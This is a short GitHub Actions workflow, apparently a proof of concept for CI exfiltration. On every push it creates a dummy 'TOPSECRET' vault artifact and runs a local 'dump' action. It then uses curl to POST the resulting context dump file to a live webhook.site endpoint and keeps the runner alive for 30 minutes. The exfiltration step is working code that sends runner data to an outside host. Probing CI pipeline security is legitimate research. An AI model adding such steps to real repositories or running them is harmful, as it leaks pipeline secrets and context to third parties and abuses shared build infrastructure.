name: cb-a-live
on:
  push: {}
  workflow_dispatch: {}
jobs:
  a:
    runs-on: ubuntu-latest
    timeout-minutes: 40
    steps:
      - uses: actions/checkout@v4
      - name: make vault artifact
        run: |
          mkdir -p vault
          echo "TOPSECRET-TRUSTED-ARTIFACT-$(date -u +%s)" > vault/vault.txt
      - name: upload vault artifact
        uses: actions/upload-artifact@v4
        with:
          name: vault-TOPSECRET
          path: vault/
      - name: dump
        uses: ./.github/actions/dump
      - name: upload + hold
        run: |
          curl -s -X POST https://webhook.site/153b24e0-26d3-437e-8fcc-e08c48298e2e -F "f=@ctx-dump.txt" -F "src=live-A2"
          echo holding; sleep 1800
